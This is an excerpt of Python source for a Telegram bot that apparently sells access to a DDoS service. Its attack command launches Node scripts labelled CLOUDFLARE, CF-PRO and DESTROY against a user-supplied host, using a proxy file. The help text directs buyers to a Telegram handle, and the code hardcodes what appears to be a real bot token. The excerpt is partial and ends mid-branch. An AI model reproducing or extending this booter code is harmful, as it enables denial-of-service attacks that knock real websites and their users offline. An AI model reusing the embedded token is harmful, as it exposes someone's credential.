...
import random
import string
OWNERS = [5644759732]  # replace with admin's ids
USERS_FILE = "users.txt"  # dont change
bot_token = '6481506734:AAFIxjiNIALDFJhWKAR8R3XSiNm7obJP2NQ'  # edit to your bot token
...
def helpcmd(message):
    ...
    f"\n\nTo buy bot access - message @death_noname"
...
def attack(message):
    ...
    methods = ['CLOUDFLARE', 'CF-PRO', 'DESTROY']
    if method in methods:
        bot.send_message(message.chat.id, 'Loading server(s) for attack...')
        if method == "CLOUDFLARE":
            subprocess.run(['node', 'tls-cloudflare', host, time, '80', '10', 'HTTPS.txt'], capture_output=True, text=True)
            bot.send_message(message.chat.id, "Attack started with (4) server(s)")
        elif method == "CF-PRO":
            subprocess.run(['node', 'cf-pro', 'GET', host, 'HTTPS.txt', time, '80', '10'], capture_output=True, text=True)
            bot.send_message(message.chat.id, "Attack started with (4) server(s)")
        elif method == "DESTROY":
            subprocess.run(['node', 'DESTROY', host, time, '80', '10', 'HTTPS.txt'], capture_output=True, text=True)
            bot.send_message(message.chat.id, "Attack started with (4) server(s)")
        else:
